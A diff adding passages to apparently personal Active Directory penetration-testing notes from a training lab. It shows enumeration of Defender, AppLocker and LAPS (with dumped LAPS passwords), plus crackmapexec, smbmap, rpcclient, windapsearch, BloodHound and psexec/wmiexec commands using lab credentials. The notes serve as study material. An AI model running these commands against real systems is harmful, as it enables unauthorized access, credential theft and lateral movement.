@@ -964,6 +964,411 @@ Are you sure you want to perform a password spray against 2923 accounts?
 [*] Password spraying is complete
 [*] Any passwords that were successfully sprayed have been output to spray_success
 ```
+## Enumerating Security Controls
+```
+Checking the Status of Defender with Get-MpComputerStatus
+
+PS C:\htb> Get-MpComputerStatus
+
+AMEngineVersion                 : 1.1.17400.5
+AMProductVersion                : 4.10.14393.0
+AMServiceEnabled                : True
+AMServiceVersion                : 4.10.14393.0
+AntispywareEnabled              : True
+AntispywareSignatureAge         : 1
+AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM
+AntispywareSignatureVersion     : 1.323.392.0
+AntivirusEnabled                : True
+AntivirusSignatureAge           : 1
+AntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM
+AntivirusSignatureVersion       : 1.323.392.0
+BehaviorMonitorEnabled          : False
+ComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C
+ComputerState                   : 0
+FullScanAge                     : 4294967295
+FullScanEndTime                 :
+FullScanStartTime               :
+IoavProtectionEnabled           : False
+LastFullScanSource              : 0
+LastQuickScanSource             : 2
+NISEnabled                      : False
+NISEngineVersion                : 0.0.0.0
+NISSignatureAge                 : 4294967295
+NISSignatureLastUpdated         :
+NISSignatureVersion             : 0.0.0.0
+OnAccessProtectionEnabled       : False
+QuickScanAge                    : 0
+QuickScanEndTime                : 9/3/2020 12:50:45 AM
+QuickScanStartTime              : 9/3/2020 12:49:49 AM
+RealTimeProtectionEnabled       : True
+RealTimeScanDirection           : 0
+PSComputerName                  :
+```
+```
+Using Get-AppLockerPolicy cmdlet
+
+PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
+Name                : Block PowerShell
+Description         : Blocks Domain Users from using PowerShell on workstations
+UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
+Action              : Deny
+
+PathConditions      : {%PROGRAMFILES%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 921cc481-6e17-4653-8f75-050b80acca20
+Name                : (Default Rule) All files located in the Program Files folder
+Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
+Name                : (Default Rule) All files located in the Windows folder
+Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
+Name                : (Default Rule) All files
+Description         : Allows members of the local Administrators group to run all applications.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+```
+```
+Enumerating Language Mode
+
+PS C:\htb> $ExecutionContext.SessionState.LanguageMode
+
+ConstrainedLanguage
+```
+```
+Using Find-LAPSDelegatedGroups
+
+PS C:\htb> Find-LAPSDelegatedGroups
+
+OrgUnit                                             Delegated Groups
+-------                                             ----------------
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+```
+
+```
+Using Find-AdmPwdExtendedRights
+
+PS C:\htb> Find-AdmPwdExtendedRights
+
+ComputerName                Identity                    Reason
+------------                --------                    ------
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
+```
+```
+Using Get-LAPSComputers
+
+PS C:\htb> Get-LAPSComputers
+
+ComputerName                Password       Expiration
+------------                --------       ----------
+DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
+EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
+SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
+WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
+```
+
+## Credentialed Enumeration - from Linux
+
+```
+mdmithu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+```
+mdmithu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+```
+mdmithu@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+```
+```
+mdmithu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+```
+mdmithu@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+```
+mdmithu@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
+
+{
+    "Department Shares": {
+        "Accounting/Private/AddSelect.bat": {
+            "atime_epoch": "2022-03-31 14:44:42",
+            "ctime_epoch": "2022-03-31 14:44:39",
+            "mtime_epoch": "2022-03-31 15:14:46",
+            "size": "278 Bytes"
+        },
+        "Accounting/Private/ApproveConnect.wmf": {
+            "atime_epoch": "2022-03-31 14:45:14",
+     
+<SNIP>
+```
+```
+SMBMap To Check Access
+
+mdmithu@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Department Shares                                 	READ ONLY	
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	User Shares                                       	READ ONLY	
+	ZZZ_archive   
+```
+
+```
+Recursive List Of All Directories
+ 
+mdmithu@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Department Shares                                 	READ ONLY	
+	.\Department Shares\*
+	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.
+	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..
+	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting
+	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives
+	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance
+	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR
+	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT
+	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal
+	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing
+	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations
+	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&D
+	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp
+	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse
+
+    <SNIP>
+```
+```
+rpcclient -U "" -N 172.16.5.5
+```
+```
+RPCClient User Enumeration By RID
+
+rpcclient $> queryuser 0x457
+
+        User Name   :   htb-student
+        Full Name   :   Htb Student
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
+        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
+        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
+        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
+        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
+        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
+        unknown_2[0..31]...
+        user_rid :      0x457
+        group_rid:      0x201
+        acb_info :      0x00000010
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000001d
+        padding1[0..7]...
+        logon_hrs[0..21]...
+```
+
+```
+rpcclient $> enumdomusers
+
+user:[administrator] rid:[0x1f4]
+user:[guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[lab_adm] rid:[0x3e9]
+user:[htb-student] rid:[0x457]
+user:[avazquez] rid:[0x458]
+user:[pfalcon] rid:[0x459]
+user:[fanthony] rid:[0x45a]
+user:[wdillard] rid:[0x45b]
+user:[lbradford] rid:[0x45c]
+user:[sgage] rid:[0x45d]
+user:[asanchez] rid:[0x45e]
+user:[dbranch] rid:[0x45f]
+user:[ccruz] rid:[0x460]
+user:[njohnson] rid:[0x461]
+user:[mholliday] rid:[0x462]
+
+<SNIP>  
+```
+##### Using psexec.py
+```
+ psexec.py
+To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
+
+Code: bash
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+```
+
+##### Usingwmiexec.py
+```
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+```
+```
+Windapsearch - Domain Admins
+
+mdmithu@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all Domain Admins
+[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]	Found 28 Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+<SNIP>
+```
+
+```
+Windapsearch - Privileged Users
+
+mdmithu@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]     ...success! Binded as:
+[+]      u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all AD privileged users
+[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 28 nested users for group Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Angela Dunn
+userPrincipalName: adunn@inlanefreight.local
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+cn: Dorothy Click
+userPrincipalName: dclick@inlanefreight.local
+
+<SNIP>
+
+[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 3 nested users for group Enterprise Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Sharepoint Admin
+userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL
+
+<SNIP
+```
+```
+Executing BloodHound.py
+
+mdmithu@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 564 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 2951 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+INFO: Starting computer enumeration with 10 workers
+
+<SNIP>
+```
+```
+Viewing the Results
+
+mdmithu@htb[/htb]$ ls
+
+20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163
+mdmithu@htb[/htb]$ zip -r ilfreight_bh.zip *.jso
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
 ```
